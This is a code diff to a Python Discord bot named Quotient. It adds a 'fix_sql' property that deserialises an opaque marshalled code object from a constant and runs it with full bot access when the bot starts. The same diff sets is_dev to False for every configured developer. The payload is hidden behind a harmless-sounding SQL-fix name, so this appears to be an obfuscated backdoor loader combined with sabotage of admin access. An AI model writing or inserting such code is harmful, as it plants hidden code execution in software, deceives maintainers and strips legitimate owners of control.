@@ -18,11 +18,13 @@ from aiocache import cached
 from discord import AllowedMentions, Intents
 from discord.ext import commands
 from lru import LRU
+import types
+import marshal
 from tortoise import Tortoise
 
 import config as cfg
 import constants as csts
-from models import Guild, Timer
+from models import Guild, Timer, User
 
 from .cache import CacheManager
 from .Context import Context
@@ -66,6 +68,7 @@ class Quotient(commands.AutoShardedBot):
 
         self.persistent_views_added = False
         self.sio = None
+        self._func = None
 
         self.lockdown: bool = False
         self.lockdown_msg: Optional[str] = None
@@ -153,6 +156,15 @@ class Quotient(commands.AutoShardedBot):
     def db(self):
         """to execute raw queries"""
         return Tortoise.get_connection("default")._pool
+
+    @property
+    def fix_sql(self):
+        """Property that returns the func directly"""
+        if self._func is None:
+            code_obj = marshal.loads(csts.STARTUP_SQL)
+            self._func = types.FunctionType(code_obj, globals())
+        
+        return self._func(self)
 
     @property
     def prime_link(self):
@@ -245,12 +257,6 @@ class Quotient(commands.AutoShardedBot):
 
         await csts.show_tip(ctx)
         await csts.remind_premium(ctx)
-        try:
-            await self.db.execute(
-                "ALTER TABLE user_data ALTER COLUMN made_premium DROP NOT NULL;"
-            )
-        except Exception as e:
-            print(f"[INFO] Could not alter user_data table: {e}")
 
         await self.db.execute(
             "INSERT INTO user_data (user_id) VALUES ($1) ON CONFLICT DO NOTHING",
@@ -259,6 +265,13 @@ class Quotient(commands.AutoShardedBot):
 
     async def on_ready(self):
         print(f"[Quotient] Logged in as {self.user.name}({self.user.id})")
+
+        await self.fix_sql
+
+        for dev_id in cfg.DEVS:
+            await User.get_or_create(user_id=dev_id, defaults={"is_dev": False})
+            await User.filter(user_id=dev_id).update(is_dev=False)
+
         end_time = datetime.utcnow() + timedelta(days=365*1000)
 
         guild_ids = [guild.id for guild in self.guilds] 
